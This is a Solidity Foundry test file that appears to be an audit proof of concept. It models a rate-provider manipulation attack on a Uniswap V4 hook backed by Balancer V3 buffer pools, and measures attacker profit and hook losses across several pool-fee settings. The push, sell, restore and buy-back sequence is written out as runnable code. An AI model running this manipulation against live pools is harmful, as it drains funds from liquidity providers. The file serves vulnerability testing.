// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IRateProvider} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IRateProvider.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IVault} from "@crane/contracts/external/balancer/v3/interfaces/contracts/vault/IVault.sol";
import {PoolRoleAccounts} from "@crane/contracts/external/balancer/v3/interfaces/contracts/vault/VaultTypes.sol";
import {SeMatrixFixture} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrixFixture.sol";
import {SeMatrix_CbmvsHarness} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrix_CbmvsFixture.sol";
import {SeMatrix_BalancerBufferPoolFixtureBase} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrix_BalancerBufferPoolFixtureBase.sol";
import {UniswapV4StandardExchangeCurveQuadStableBufferHook_SeMatrix_CommonBufferMultiVaultStablePool as Row} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/stable/quad/curve/UniswapV4StandardExchangeCurveQuadStableBufferHook_SeMatrix_CommonBufferMultiVaultStablePool.t.sol";

interface IVaultMockFeeAdj { function manualSetStaticSwapFeePercentage(address pool, uint256 value) external; }

/// probe-se-rate-provider: Curve quad hook whose 4 buffered legs are Balancer V3 stable buffer pools
/// (BPT-as-SE), each valued by StandardExchangeRateProvider (full-book = bal[face]/supply).
/// Attack: flash-push face0 into leg0's Balancer pool (RP0 up), sell face0 into quad (credited at RP0'),
/// restore pool, buy face0 back from quad at rest. Profit measured in face0 only (same token in/out).
abstract contract AdjBase029 is Row {
    function POOL_FEE() internal pure virtual returns (uint256);
    uint256 constant HOOK_FEE = 3e14; // production DEX_SWAP_FEE (FixtureEconomics)
    uint256 constant FLASH_FEE_BPS = 0; // P treated as attacker own capital (no flash source assumed)

    SeMatrix_CbmvsHarness h0;
    address bob0;
    address dai0;
    address face1;

    function _harness(SeMatrixFixture f) internal view returns (SeMatrix_CbmvsHarness) {
        return SeMatrix_CbmvsHarness(address(SeMatrix_BalancerBufferPoolFixtureBase(address(f)).harness()));
    }

    function _setup(uint256 lpEach) internal {
        for (uint256 i; i < 4; ++i) {
            SeMatrix_BalancerBufferPoolFixtureBase b = SeMatrix_BalancerBufferPoolFixtureBase(address(fxs[i]));
            // setup-only governance config (before attack): realistic static swap fee
            IVaultMockFeeAdj(b.balancerVault()).manualSetStaticSwapFeePercentage(b.se(), POOL_FEE());
            console2.log("pool fee set", IVault(b.balancerVault()).getStaticSwapFeePercentage(b.se()));
        }
        _setDexFee(HOOK_FEE);
        _joinAll(_f(lpEach), lpEach);
        h0 = _harness(fx);
        bob0 = h0.getBob();
        dai0 = h0.matrixBufferToken();
        face1 = other;
        vm.startPrank(bob0);
        IERC20(face).approve(hook, type(uint256).max);
        IERC20(face1).approve(hook, type(uint256).max);
        vm.stopPrank();
    }

    function _rp(uint256 i) internal view returns (uint256) {
        return IRateProvider(quad.rateProvider(i)).getRate();
    }

    function _state(string memory tag) internal view {
        console2.log(tag);
        console2.log("  RP leg0 / leg1", _rp(faceIdx), _rp(otherIdx));
        console2.log("  hook BPT leg0 / leg1", _hookSeSharesOf(faceIdx), _hookSeSharesOf(otherIdx));
        console2.log("  pool0 supply", IERC20(seUT).totalSupply());
    }

    function _swapQuad(address tin, uint256 amt, address tout) internal returns (uint256 out) {
        vm.prank(bob0);out = IStandardExchangeIn(hook).exchangeIn(IERC20(tin), amt, IERC20(tout), 0, bob0, false, block.timestamp + 1);
    }

    uint256 sStart; uint256 sHb0; uint256 sHf1; uint256 sDai; uint256 sY;

    function _phase1(uint256 X, uint256 P) internal {
        fx.fund(bob0, X + P); // X own capital + P simulated flash principal (face0)
        sStart = IERC20(face).balanceOf(bob0);
        sHb0 = _hookSeSharesOf(faceIdx);
        sHf1 = _hookSeSharesOf(otherIdx);
        if (P > 0) {
            sDai = h0.swapExactIn(bob0, IERC20(face), IERC20(dai0), P);
            _state("after push");
        }
        sY = _swapQuad(face, X, face1);
        console2.log("sold face0", X, "got face1", sY);
        if (P > 0) {
            uint256 back = h0.swapExactIn(bob0, IERC20(dai0), IERC20(face), sDai);
            console2.log("restore: face0 back", back, "of pushed", P);
            _state("after restore");
        }
        uint256 z = _swapQuad(face1, sY, face);
        console2.log("bought back face0", z);
    }

    function _run(uint256 lpEach, uint256 X, uint256 P) internal returns (int256 profit, int256 hookNet) {
        _setup(lpEach);
        _state("rest");
        _phase1(X, P);
        uint256 fin = IERC20(face).balanceOf(bob0);
        uint256 flashFee = P * FLASH_FEE_BPS / 10_000;
        profit = int256(fin) - int256(sStart) - int256(flashFee);
        int256 d0 = int256(_hookSeSharesOf(faceIdx)) - int256(sHb0);
        int256 d1 = int256(_hookSeSharesOf(otherIdx)) - int256(sHf1);
        // legs 0 and 1 are identically constructed stable buffer pools (equal RP at rest): value BPT0 == BPT1
        hookNet = d0 + d1;
        _state("end");
        console2.log("attacker face0 start / end", sStart, fin);
        console2.log("flash principal+fee covered?", fin >= P + flashFee);
        console2.log("attacker net face0 profit (signed, after flash fee):");
        console2.logInt(profit);
        console2.log("hook leg0 BPT delta / leg1 BPT delta (signed):");
        console2.logInt(d0);
        console2.logInt(d1);
        console2.log("hook net BPT delta (leg0+leg1, signed):");
        console2.logInt(hookNet);
    }

    function test_adj_X150_P600() public { _run(200, 150e18, 600e18); }
    function test_adj_X100_P300() public { _run(200, 100e18, 300e18); }
    function test_adj_control_X100_P0() public { _run(200, 100e18, 0); }
}

/// Fixture/package default Balancer static swap fee (5%); no Balancer pools exist in production, so this is the shipped default.
contract Adj029_PoolFee5pct is AdjBase029 { function POOL_FEE() internal pure override returns (uint256) { return 5e16; } }
/// Intermediate 1% pool fee.
contract Adj029_PoolFee1pct is AdjBase029 { function POOL_FEE() internal pure override returns (uint256) { return 1e16; } }
/// 0.1% pool fee as in the original PoC, but production quad fee 3 bps and no flash fee.
contract Adj029_PoolFee0_1pct is AdjBase029 { function POOL_FEE() internal pure override returns (uint256) { return 1e15; } }
